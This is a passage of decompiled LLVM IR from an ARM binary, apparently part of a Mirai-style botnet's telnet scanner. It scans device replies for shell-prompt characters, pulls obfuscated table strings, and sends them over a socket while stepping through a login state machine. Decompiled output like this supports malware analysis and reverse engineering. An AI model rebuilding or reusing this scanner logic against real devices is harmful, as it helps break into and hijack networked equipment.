  %v2_eb58 = icmp ugt i8 %v3_eb40, 34
  store i1 %v2_eb58, i1* %cpsr_c.global-to-local, align 1
  %v7_eb58 = icmp eq i8 %v3_eb40, 35
  store i1 %v7_eb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb58, label %dec_label_pc_eba8, label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb58
  %v2_eb60 = icmp ugt i8 %v3_eb40, 36
  store i1 %v2_eb60, i1* %cpsr_c.global-to-local, align 1
  %v7_eb60 = icmp eq i8 %v3_eb40, 37
  store i1 %v7_eb60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb60, label %dec_label_pc_eba8, label %dec_label_pc_eb90.preheader

dec_label_pc_eb90.preheader:                      ; preds = %dec_label_pc_eb60
  %v3_eb64 = add i32 %v0_e694, 28
  %v2_eb68 = add i32 %v3_eb64, %v3_eb2c
  store i32 %v2_eb68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_eb90

dec_label_pc_eb74:                                ; preds = %bb405
  %v2_eb74 = icmp ugt i8 %v3_eb98, 35
  store i1 %v2_eb74, i1* %cpsr_c.global-to-local, align 1
  %v7_eb74 = icmp eq i8 %v3_eb98, 36
  store i1 %v7_eb74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb74, label %dec_label_pc_eba8, label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb74
  %v2_eb7c = icmp ugt i8 %v3_eb98, 34
  store i1 %v2_eb7c, i1* %cpsr_c.global-to-local, align 1
  %v7_eb7c = icmp eq i8 %v3_eb98, 35
  store i1 %v7_eb7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb7c, label %dec_label_pc_eba8, label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_eb7c
  %v2_eb84 = icmp ugt i8 %v3_eb98, 36
  store i1 %v2_eb84, i1* %cpsr_c.global-to-local, align 1
  %v7_eb84 = icmp eq i8 %v3_eb98, 37
  store i1 %v7_eb84, i1* %cpsr_z.global-to-local, align 1
  %v1_eb88 = add i32 %v0_eb88, -1
  store i32 %v1_eb88, i32* %r3.global-to-local, align 4
  br i1 %v7_eb84, label %dec_label_pc_eba8, label %dec_label_pc_eb90

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb90.preheader, %dec_label_pc_eb84
  %v0_eb88 = phi i32 [ %v2_eb68, %dec_label_pc_eb90.preheader ], [ %v1_eb88, %dec_label_pc_eb84 ]
  %v0_eb90 = phi i32 [ %v1_eb30, %dec_label_pc_eb90.preheader ], [ %v1_eb90, %dec_label_pc_eb84 ]
  %v1_eb90 = add i32 %v0_eb90, -1
  store i32 %v1_eb90, i32* %r1.global-to-local, align 4
  %v2_eb90 = icmp ne i32 %v0_eb90, 0
  store i1 %v2_eb90, i1* %cpsr_c.global-to-local, align 1
  %v7_eb90 = icmp eq i32 %v0_eb90, 1
  store i1 %v7_eb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb90, label %dec_label_pc_e618.backedge.thread526, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb90
  %v1_eb98 = add i32 %v0_eb88, -2
  %v2_eb98 = inttoptr i32 %v1_eb98 to i8*
  %v3_eb98 = load i8, i8* %v2_eb98, align 1
  %v4_eb98 = zext i8 %v3_eb98 to i32
  store i32 %v4_eb98, i32* %r2.global-to-local, align 4
  %v2_eb9c = icmp ugt i8 %v3_eb98, 61
  store i1 %v2_eb9c, i1* %cpsr_c.global-to-local, align 1
  %v7_eb9c = icmp eq i8 %v3_eb98, 62
  store i1 %v7_eb9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb9c, label %dec_label_pc_eba8, label %bb405

bb405:                                            ; preds = %dec_label_pc_eb98
  %v3_eba0 = icmp ugt i8 %v3_eb98, 57
  store i1 %v3_eba0, i1* %cpsr_c.global-to-local, align 1
  %v8_eba0 = icmp eq i8 %v3_eb98, 58
  store i1 %v8_eba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eba0, label %dec_label_pc_eba8, label %dec_label_pc_eb74

dec_label_pc_eba8:                                ; preds = %dec_label_pc_eb98, %bb405, %dec_label_pc_eb84, %dec_label_pc_eb7c, %dec_label_pc_eb74, %dec_label_pc_eb60, %dec_label_pc_eb3c, %dec_label_pc_eb58, %dec_label_pc_eb50, %bb404
  %v0_ebac = phi i32 [ %v1_eb30, %dec_label_pc_eb60 ], [ %v1_eb30, %dec_label_pc_eb3c ], [ %v1_eb30, %dec_label_pc_eb58 ], [ %v1_eb30, %dec_label_pc_eb50 ], [ %v1_eb30, %bb404 ], [ %v1_eb90, %dec_label_pc_eb74 ], [ %v1_eb90, %dec_label_pc_eb7c ], [ %v1_eb90, %dec_label_pc_eb84 ], [ %v1_eb90, %bb405 ], [ %v1_eb90, %dec_label_pc_eb98 ]
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_ebac = add i32 %v0_ebac, 1
  store i32 %v1_ebac, i32* @r7, align 4
  %v1_ebb0 = call i32 @table_unlock_val(i32 23)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v3_ebc0 = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-60)
  store i32 %v3_ebc0, i32* %r0.global-to-local, align 4
  %v3_ebc4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ebc4, i32* %r2.global-to-local, align 4
  store i32 %v3_ebc0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebd0 = load i32, i32* @r5, align 4
  %v1_ebd0 = add i32 %v0_ebd0, 4
  %v2_ebd0 = inttoptr i32 %v1_ebd0 to i32*
  %v3_ebd0 = load i32, i32* %v2_ebd0, align 4
  store i32 %v3_ebd0, i32* %r0.global-to-local, align 4
  %v4_ebd4 = call i32 @__libc_send(i32 %v3_ebd0, i32 %v3_ebc0, i32 %v3_ebc4, i32 16384)
  store i32 %v4_ebd4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ebe4 = load i32, i32* @r5, align 4
  %v1_ebe4 = add i32 %v0_ebe4, 4
  %v2_ebe4 = inttoptr i32 %v1_ebe4 to i32*
  %v3_ebe4 = load i32, i32* %v2_ebe4, align 4
  store i32 %v3_ebe4, i32* %r0.global-to-local, align 4
  %v4_ebe8 = call i32 @__libc_send(i32 %v3_ebe4, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_ebf0 = call i32 @table_lock_val(i32 23)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_ebf8 = load i32, i32* @r5, align 4
  %v2_ebf8 = add i32 %v1_ebf8, 12
  %v3_ebf8 = inttoptr i32 %v2_ebf8 to i32*
  store i32 6, i32* %v3_ebf8, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_ec00:                                ; preds = %dec_label_pc_e694
  %v1_ec00 = add i32 %v0_e694, 24
  %v2_ec00 = inttoptr i32 %v1_ec00 to i32*
  %v3_ec00 = load i32, i32* %v2_ec00, align 4
  store i32 %v3_ec00, i32* %r2.global-to-local, align 4
  %v1_ec04 = add i32 %v3_ec00, -1
  store i32 %v1_ec04, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec08 = icmp eq i32 %v1_ec04, 0
  store i1 %v2_ec08, i1* %cpsr_z.global-to-local, align 1
  %tmp406 = icmp slt i32 %v1_ec04, 1
  br i1 %tmp406, label %dec_label_pc_ec7c, label %dec_label_pc_ec10

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ec00
  %v2_ec10 = add i32 %v1_ec04, %v0_e694
  store i32 %v2_ec10, i32* %r3.global-to-local, align 4
  %v1_ec14 = add i32 %v2_ec10, 28
  %v2_ec14 = inttoptr i32 %v1_ec14 to i8*
  %v3_ec14 = load i8, i8* %v2_ec14, align 1
  %v4_ec14 = zext i8 %v3_ec14 to i32
  store i32 %v4_ec14, i32* %r3.global-to-local, align 4
  %v2_ec18 = icmp ugt i8 %v3_ec14, 61
  store i1 %v2_ec18, i1* %cpsr_c.global-to-local, align 1
  %v7_ec18 = icmp eq i8 %v3_ec14, 62
  store i1 %v7_ec18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec18, label %dec_label_pc_ef34, label %bb407

bb407:                                            ; preds = %dec_label_pc_ec10
  %v3_ec1c = icmp ugt i8 %v3_ec14, 57
  store i1 %v3_ec1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ec1c = icmp eq i8 %v3_ec14, 58
  store i1 %v8_ec1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ec1c, label %dec_label_pc_ef34, label %dec_label_pc_ec24

dec_label_pc_ec24:                                ; preds = %bb407
  %v2_ec24 = icmp ugt i8 %v3_ec14, 35
  store i1 %v2_ec24, i1* %cpsr_c.global-to-local, align 1
  %v7_ec24 = icmp eq i8 %v3_ec14, 36
  store i1 %v7_ec24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec24, label %dec_label_pc_ef34, label %dec_label_pc_ec2c

dec_label_pc_ec2c:                                ; preds = %dec_label_pc_ec24
  %v2_ec2c = icmp ugt i8 %v3_ec14, 34
  store i1 %v2_ec2c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec2c = icmp eq i8 %v3_ec14, 35
  store i1 %v7_ec2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec2c, label %dec_label_pc_ef34, label %dec_label_pc_ec34

dec_label_pc_ec34:                                ; preds = %dec_label_pc_ec2c
  %v2_ec34 = icmp ugt i8 %v3_ec14, 36
  store i1 %v2_ec34, i1* %cpsr_c.global-to-local, align 1
  %v7_ec34 = icmp eq i8 %v3_ec14, 37
  store i1 %v7_ec34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec34, label %dec_label_pc_ef34, label %dec_label_pc_ec74.preheader

dec_label_pc_ec74.preheader:                      ; preds = %dec_label_pc_ec34
  %v3_ec38 = add i32 %v0_e694, 28
  %v2_ec3c = add i32 %v3_ec38, %v3_ec00
  store i32 %v2_ec3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec74

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec74
  %v1_ec48 = add i32 %v0_ec6c, -2
  %v2_ec48 = inttoptr i32 %v1_ec48 to i8*
  %v3_ec48 = load i8, i8* %v2_ec48, align 1
  %v4_ec48 = zext i8 %v3_ec48 to i32
  store i32 %v4_ec48, i32* %r2.global-to-local, align 4
  %v2_ec4c = icmp ugt i8 %v3_ec48, 61
  store i1 %v2_ec4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ec4c = icmp eq i8 %v3_ec48, 62
  store i1 %v7_ec4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec4c, label %dec_label_pc_ef34, label %bb408

bb408:                                            ; preds = %dec_label_pc_ec48
  %v3_ec50 = icmp ugt i8 %v3_ec48, 57
  store i1 %v3_ec50, i1* %cpsr_c.global-to-local, align 1
  %v8_ec50 = icmp eq i8 %v3_ec48, 58
  store i1 %v8_ec50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ec50, label %dec_label_pc_ef34, label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %bb408
  %v2_ec58 = icmp ugt i8 %v3_ec48, 35
  store i1 %v2_ec58, i1* %cpsr_c.global-to-local, align 1
  %v7_ec58 = icmp eq i8 %v3_ec48, 36
  store i1 %v7_ec58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec58, label %dec_label_pc_ef34, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec58
  %v2_ec60 = icmp ugt i8 %v3_ec48, 34
  store i1 %v2_ec60, i1* %cpsr_c.global-to-local, align 1
  %v7_ec60 = icmp eq i8 %v3_ec48, 35
  store i1 %v7_ec60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec60, label %dec_label_pc_ef34, label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec60
  %v2_ec68 = icmp ugt i8 %v3_ec48, 36
  store i1 %v2_ec68, i1* %cpsr_c.global-to-local, align 1
  %v7_ec68 = icmp eq i8 %v3_ec48, 37
  store i1 %v7_ec68, i1* %cpsr_z.global-to-local, align 1
  %v1_ec6c = add i32 %v0_ec6c, -1
  store i32 %v1_ec6c, i32* %r3.global-to-local, align 4
  br i1 %v7_ec68, label %dec_label_pc_ef34, label %dec_label_pc_ec74

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ec74.preheader, %dec_label_pc_ec68
  %v0_ec6c = phi i32 [ %v2_ec3c, %dec_label_pc_ec74.preheader ], [ %v1_ec6c, %dec_label_pc_ec68 ]
  %v0_ec74 = phi i32 [ %v1_ec04, %dec_label_pc_ec74.preheader ], [ %v1_ec74, %dec_label_pc_ec68 ]
  %v1_ec74 = add i32 %v0_ec74, -1
  store i32 %v1_ec74, i32* %r0.global-to-local, align 4
  %v2_ec74 = icmp ne i32 %v0_ec74, 0
  store i1 %v2_ec74, i1* %cpsr_c.global-to-local, align 1
  %v7_ec74 = icmp eq i32 %v0_ec74, 1
  store i1 %v7_ec74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ec74, label %dec_label_pc_ec7c, label %dec_label_pc_ec48

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec74, %dec_label_pc_ec00
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_ec80 = call i32 @table_unlock_val(i32 30)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_ec88 = call i32 @table_unlock_val(i32 31)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_ec98 = call i32 @table_retrieve_val(i32 30, i32* nonnull %stack_var_-60)
  store i32 %v3_ec98, i32* @r4, align 4
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_ecac = call i32 @table_retrieve_val(i32 31, i32* %v2_ecac)
  %v3_ecb0 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_ecac, 16777216
  %v1_ecb4 = sdiv i32 %sext, 16777216
  store i32 %v1_ecb4, i32* @r6, align 4
  %v0_ecb8 = load i32, i32* @r4, align 4
  store i32 %v0_ecb8, i32* %r2.global-to-local, align 4
  %v1_ecbc = add i32 %v3_ecb0, -1
  store i32 %v1_ecbc, i32* %r3.global-to-local, align 4
  %v0_ecc0 = load i32, i32* @sl, align 4
  store i32 %v0_ecc0, i32* %r0.global-to-local, align 4
  %v0_ecc4 = load i32, i32* @r5, align 4
  %v1_ecc4 = add i32 %v0_ecc4, 24
  %v2_ecc4 = inttoptr i32 %v1_ecc4 to i32*
  %v3_ecc4 = load i32, i32* %v2_ecc4, align 4
  store i32 %v3_ecc4, i32* %r1.global-to-local, align 4
  %v4_ecc8 = call i32 @util_memsearch(i32 %v0_ecc0, i32 %v3_ecc4, i32 %v0_ecb8, i32 %v1_ecbc)
  store i32 %v4_ecc8, i32* %r0.global-to-local, align 4
  %v2_eccc = icmp eq i32 %v4_ecc8, -1
  store i1 %v2_eccc, i1* %cpsr_c.global-to-local, align 1
  %v7_eccc = icmp eq i32 %v4_ecc8, -1
  store i1 %v7_eccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eccc, label %dec_label_pc_f070, label %dec_label_pc_ecdc

dec_label_pc_ecdc:                                ; preds = %dec_label_pc_f070, %dec_label_pc_ec7c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_ece0 = call i32 @table_lock_val(i32 30)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_ece8 = call i32 @table_lock_val(i32 31)
  store i32 %v1_ece8, i32* %r0.global-to-local, align 4
  %v0_ecec = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecec = icmp eq i32 %v0_ecec, 0
  store i1 %v2_ecec, i1* %cpsr_z.global-to-local, align 1
  %tmp409 = icmp slt i32 %v0_ecec, 1
  br i1 %tmp409, label %dec_label_pc_ede0, label %dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge

dec_label_pc_ecdc.dec_label_pc_ef38_crit_edge:    ; preds = %dec_label_pc_ecdc
  %v0_ef38.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ef38

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_e694
  %v1_ecf8 = add i32 %v0_e694, 24
  %v2_ecf8 = inttoptr i32 %v1_ecf8 to i32*
  %v3_ecf8 = load i32, i32* %v2_ecf8, align 4
  store i32 %v3_ecf8, i32* %r2.global-to-local, align 4
  %v1_ecfc = add i32 %v3_ecf8, -1
  store i32 %v1_ecfc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed00 = icmp eq i32 %v1_ecfc, 0
  store i1 %v2_ed00, i1* %cpsr_z.global-to-local, align 1
  %tmp410 = icmp slt i32 %v1_ecfc, 1
  br i1 %tmp410, label %dec_label_pc_ed64, label %dec_label_pc_ed08

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ecf8
  %v2_ed08 = add i32 %v1_ecfc, %v0_e694
  store i32 %v2_ed08, i32* %r3.global-to-local, align 4
  %v1_ed0c = add i32 %v2_ed08, 28
  %v2_ed0c = inttoptr i32 %v1_ed0c to i8*
  %v3_ed0c = load i8, i8* %v2_ed0c, align 1
  %v4_ed0c = zext i8 %v3_ed0c to i32
  store i32 %v4_ed0c, i32* %r3.global-to-local, align 4
  %v2_ed10 = icmp ugt i8 %v3_ed0c, 61
  store i1 %v2_ed10, i1* %cpsr_c.global-to-local, align 1
  %v7_ed10 = icmp eq i8 %v3_ed0c, 62
  store i1 %v7_ed10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed10, label %dec_label_pc_ef2c, label %bb411

bb411:                                            ; preds = %dec_label_pc_ed08
  %v3_ed14 = icmp ugt i8 %v3_ed0c, 57
  store i1 %v3_ed14, i1* %cpsr_c.global-to-local, align 1
  %v8_ed14 = icmp eq i8 %v3_ed0c, 58
  store i1 %v8_ed14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ed14, label %dec_label_pc_ef2c, label %dec_label_pc_ed1c

dec_label_pc_ed1c:                                ; preds = %bb411
  %v2_ed1c = icmp ugt i8 %v3_ed0c, 35
  store i1 %v2_ed1c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed1c = icmp eq i8 %v3_ed0c, 36
  store i1 %v7_ed1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed1c, label %dec_label_pc_ef2c, label %dec_label_pc_ed24

dec_label_pc_ed24:                                ; preds = %dec_label_pc_ed1c
  %v2_ed24 = icmp ugt i8 %v3_ed0c, 34
  store i1 %v2_ed24, i1* %cpsr_c.global-to-local, align 1
  %v7_ed24 = icmp eq i8 %v3_ed0c, 35
  store i1 %v7_ed24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed24, label %dec_label_pc_ef2c, label %dec_label_pc_ed5c.preheader

dec_label_pc_ed5c.preheader:                      ; preds = %dec_label_pc_ed24
  %v3_ed28 = add i32 %v0_e694, 28
  %v2_ed2c = add i32 %v3_ed28, %v3_ecf8
  store i32 %v2_ed2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed5c
  %v1_ed38 = add i32 %v0_ed54, -2
  %v2_ed38 = inttoptr i32 %v1_ed38 to i8*
  %v3_ed38 = load i8, i8* %v2_ed38, align 1
  %v4_ed38 = zext i8 %v3_ed38 to i32
  store i32 %v4_ed38, i32* %r2.global-to-local, align 4
  %v2_ed3c = icmp ugt i8 %v3_ed38, 61
  store i1 %v2_ed3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed3c = icmp eq i8 %v3_ed38, 62
  store i1 %v7_ed3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed3c, label %dec_label_pc_ef2c, label %bb412

bb412:                                            ; preds = %dec_label_pc_ed38
  %v3_ed40 = icmp ugt i8 %v3_ed38, 57
  store i1 %v3_ed40, i1* %cpsr_c.global-to-local, align 1
  %v8_ed40 = icmp eq i8 %v3_ed38, 58
  store i1 %v8_ed40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ed40, label %dec_label_pc_ef2c, label %dec_label_pc_ed48

dec_label_pc_ed48:                                ; preds = %bb412
  %v2_ed48 = icmp ugt i8 %v3_ed38, 35
  store i1 %v2_ed48, i1* %cpsr_c.global-to-local, align 1
  %v7_ed48 = icmp eq i8 %v3_ed38, 36
  store i1 %v7_ed48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed48, label %dec_label_pc_ef2c, label %dec_label_pc_ed50

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ed48
  %v2_ed50 = icmp ugt i8 %v3_ed38, 34
  store i1 %v2_ed50, i1* %cpsr_c.global-to-local, align 1
  %v7_ed50 = icmp eq i8 %v3_ed38, 35
  store i1 %v7_ed50, i1* %cpsr_z.global-to-local, align 1
  %v1_ed54 = add i32 %v0_ed54, -1
  store i32 %v1_ed54, i32* %r3.global-to-local, align 4
  br i1 %v7_ed50, label %dec_label_pc_ef2c, label %dec_label_pc_ed5c

dec_label_pc_ed5c:                                ; preds = %dec_label_pc_ed5c.preheader, %dec_label_pc_ed50
  %v0_ed54 = phi i32 [ %v2_ed2c, %dec_label_pc_ed5c.preheader ], [ %v1_ed54, %dec_label_pc_ed50 ]
  %v0_ed5c = phi i32 [ %v1_ecfc, %dec_label_pc_ed5c.preheader ], [ %v1_ed5c, %dec_label_pc_ed50 ]
  %v1_ed5c = add i32 %v0_ed5c, -1
  store i32 %v1_ed5c, i32* %r0.global-to-local, align 4
  %v2_ed5c = icmp ne i32 %v0_ed5c, 0
  store i1 %v2_ed5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed5c = icmp eq i32 %v0_ed5c, 1
  store i1 %v7_ed5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed5c, label %dec_label_pc_ed64, label %dec_label_pc_ed38

dec_label_pc_ed64:                                ; preds = %dec_label_pc_ed5c, %dec_label_pc_ecf8
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_ed68 = call i32 @table_unlock_val(i32 29)
  store i32 %v2_eca4, i32* %r1.global-to-local, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v3_ed78 = call i32 @table_retrieve_val(i32 29, i32* %v2_ecac)
  %v3_ed7c = load i8, i8* %stack_var_-56, align 1
  %v4_ed7c = sext i8 %v3_ed7c to i32
  store i32 %v3_ed78, i32* %r2.global-to-local, align 4
  %v1_ed84 = add nsw i32 %v4_ed7c, -1
  store i32 %v1_ed84, i32* %r3.global-to-local, align 4
  %v0_ed88 = load i32, i32* @sl, align 4
  store i32 %v0_ed88, i32* %r0.global-to-local, align 4
  %v0_ed8c = load i32, i32* @r5, align 4
  %v1_ed8c = add i32 %v0_ed8c, 24
  %v2_ed8c = inttoptr i32 %v1_ed8c to i32*
  %v3_ed8c = load i32, i32* %v2_ed8c, align 4
  store i32 %v3_ed8c, i32* %r1.global-to-local, align 4
  %v4_ed90 = call i32 @util_memsearch(i32 %v0_ed88, i32 %v3_ed8c, i32 %v3_ed78, i32 %v1_ed84)
  store i32 %v4_ed90, i32* %r0.global-to-local, align 4
  %v1_ed94 = add i32 %v4_ed90, 1
  store i32 %v1_ed94, i32* @r7, align 4
  %v2_ed94 = icmp eq i32 %v4_ed90, -1
  store i1 %v2_ed94, i1* %cpsr_c.global-to-local, align 1
  %v7_ed94 = icmp eq i32 %v1_ed94, 0
  store i1 %v7_ed94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed94, label %thread-pre-split103, label %bb413

bb413:                                            ; preds = %dec_label_pc_ed64
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split103

thread-pre-split103:                              ; preds = %dec_label_pc_ed64, %bb413
  %v0_ed9c = phi i1 [ false, %bb413 ], [ true, %dec_label_pc_ed64 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_ed9c, i1* %cpsr_z.global-to-local, align 1
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_f1a0 = call i32 @table_lock_val(i32 29)
  store i32 %v1_f1a0, i32* %r0.global-to-local, align 4
  %v0_f1a4 = load i32, i32* @r5, align 4
  br i1 %v0_ed9c, label %dec_label_pc_f19c, label %dec_label_pc_edac

dec_label_pc_edac:                                ; preds = %thread-pre-split103, %dec_label_pc_ef2c
  %v0_edac = phi i32 [ %v0_e694, %dec_label_pc_ef2c ], [ %v0_f1a4, %thread-pre-split103 ]
  %v1_edac = inttoptr i32 %v0_edac to i32*
  %v2_edac = load i32, i32* %v1_edac, align 4
  store i32 %v2_edac, i32* %r3.global-to-local, align 4
  %v1_edb0 = add i32 %v0_edac, 4
  %v2_edb0 = inttoptr i32 %v1_edb0 to i32*
  %v3_edb0 = load i32, i32* %v2_edb0, align 4
  store i32 %v3_edb0, i32* %r0.global-to-local, align 4
  %v1_edb4 = add i32 %v2_edac, 13
  %v2_edb4 = inttoptr i32 %v1_edb4 to i8*
  %v3_edb4 = load i8, i8* %v2_edb4, align 1
  %v4_edb4 = zext i8 %v3_edb4 to i32
  store i32 %v4_edb4, i32* %r2.global-to-local, align 4
  %v1_edb8 = add i32 %v2_edac, 4
  %v2_edb8 = inttoptr i32 %v1_edb8 to i32*
  %v3_edb8 = load i32, i32* %v2_edb8, align 4
  store i32 %v3_edb8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_edc0 = call i32 @__libc_send(i32 %v3_edb0, i32 %v3_edb8, i32 %v4_edb4, i32 16384)
  store i32 %v4_edc0, i32* %r0.global-to-local, align 4
  %v0_edc4 = load i32, i32* @r5, align 4
  %v1_edc4 = add i32 %v0_edc4, 4
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  %v3_edc4 = load i32, i32* %v2_edc4, align 4
  store i32 %v3_edc4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_edd4 = call i32 @__libc_send(i32 %v3_edc4, i32 ptrtoint ([3 x i8]* @global_var_186ec.498 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_eddc = load i32, i32* @r5, align 4
  %v2_eddc = add i32 %v1_eddc, 12
  %v3_eddc = inttoptr i32 %v2_eddc to i32*
  store i32 5, i32* %v3_eddc, align 4
  br label %dec_label_pc_ede0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_eeac, %bb417, %dec_label_pc_ecdc, %dec_label_pc_efbc, %dec_label_pc_ef38, %dec_label_pc_f000, %dec_label_pc_edac
  %v0_ede0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ede0 = icmp eq i32 %v0_ede0, 0
  store i1 %v2_ede0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ede0, label %dec_label_pc_e614.loopexit, label %dec_label_pc_e7b4

dec_label_pc_edec:                                ; preds = %dec_label_pc_e694
  %v1_edec = add i32 %v0_e694, 24
  %v2_edec = inttoptr i32 %v1_edec to i32*
  %v3_edec = load i32, i32* %v2_edec, align 4
  store i32 %v3_edec, i32* %r2.global-to-local, align 4
  %v0_edf0 = load i32, i32* @sl, align 4
  store i32 %v0_edf0, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_edf8146 = icmp eq i32 %v3_edec, 0
  store i1 %v3_edf8146, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_edf8146, i1* %cpsr_z.global-to-local, align 1
  %v6_edfc153 = icmp sgt i32 %v3_edec, 0
  br i1 %v6_edfc153, label %dec_label_pc_ee00.preheader, label %dec_label_pc_eeac

dec_label_pc_edf8.loopexit:                       ; preds = %dec_label_pc_ee1c
  %v2_ee24 = add i32 %v1_ee24, 2
  store i32 %v2_ee24, i32* @r4, align 4
  %v2_ee28 = add i32 %v1_ee28, 2
  store i32 %v2_ee28, i32* @r7, align 4
  %v3_edf8 = icmp uge i32 %v2_ee28, %v1_edf8
  store i1 %v3_edf8, i1* %cpsr_c.global-to-local, align 1
  %v9_edf8 = icmp eq i32 %v2_ee28, %v1_edf8
  store i1 %v9_edf8, i1* %cpsr_z.global-to-local, align 1
  %v6_edfc = icmp slt i32 %v2_ee28, %v1_edf8
  br i1 %v6_edfc, label %dec_label_pc_ee00.preheader, label %dec_label_pc_eeac

dec_label_pc_ee00.preheader:                      ; preds = %dec_label_pc_edec, %dec_label_pc_edf8.loopexit
  %v6_eeb4239 = phi i32 [ %v6_eeb4240, %dec_label_pc_edf8.loopexit ], [ %v0_e694, %dec_label_pc_edec ]
  %v1_ee28222 = phi i32 [ %v2_ee28, %dec_label_pc_edf8.loopexit ], [ 0, %dec_label_pc_edec ]
  %v1_ee0c220 = phi i32 [ %v1_edf8, %dec_label_pc_edf8.loopexit ], [ %v3_edec, %dec_label_pc_edec ]
